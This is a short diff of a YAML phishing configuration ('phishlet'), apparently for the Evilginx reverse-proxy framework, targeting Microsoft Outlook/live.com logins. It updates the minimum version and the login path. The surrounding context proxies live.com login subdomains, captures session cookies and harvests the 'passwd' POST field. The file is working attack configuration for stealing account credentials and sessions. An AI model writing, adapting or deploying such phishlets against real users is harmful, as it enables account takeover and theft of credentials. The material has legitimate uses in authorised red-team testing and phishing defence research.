@@ -1,5 +1,5 @@
 author: '@mrgretzky'
-min_ver: '2.2.0'
+min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: true}
   - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
@@ -26,5 +26,6 @@ credentials:
     key: 'passwd'
     search: '(.*)'
     type: 'post'
-landing_path:
-  - '/owa/?nlp=1'
+login:
+  domain: 'outlook.live.com'
+  path: '/owa/?nlp=1'
